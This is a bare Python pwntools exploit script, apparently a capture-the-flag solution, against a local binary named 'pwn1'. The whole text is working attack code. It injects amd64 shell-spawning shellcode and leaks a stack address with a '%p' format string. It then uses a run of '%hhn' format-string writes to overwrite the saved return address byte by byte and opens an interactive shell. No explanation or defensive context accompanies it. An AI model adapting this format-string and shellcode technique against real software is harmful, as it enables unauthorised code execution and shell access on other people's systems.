from pwn import *
import re
context.arch = "amd64"
 
io = process("./pwn1")
 
shellcode = "A"*40+asm(shellcraft.amd64.linux.sh())
io.sendlineafter("> ",shellcode)
 
leak_payload = "%p"
io.sendlineafter("> ",leak_payload)
leak = int(io.readline().strip(),16)
shellcode = leak+0x28
saved_rip = leak+0x108
 
writes = re.findall(".{2}",hex(shellcode))[1::]
index = 0
for write in writes[::-1]:
    overwrite_payload = "%"+str(int(write,16)).rjust(3,"0")+"x"
    overwrite_payload += "%8$hhn00000"
    overwrite_payload += p64(saved_rip+index)
    io.sendlineafter("> ",overwrite_payload)
    index+=1
io.sendlineafter("> ","q")
io.interactive()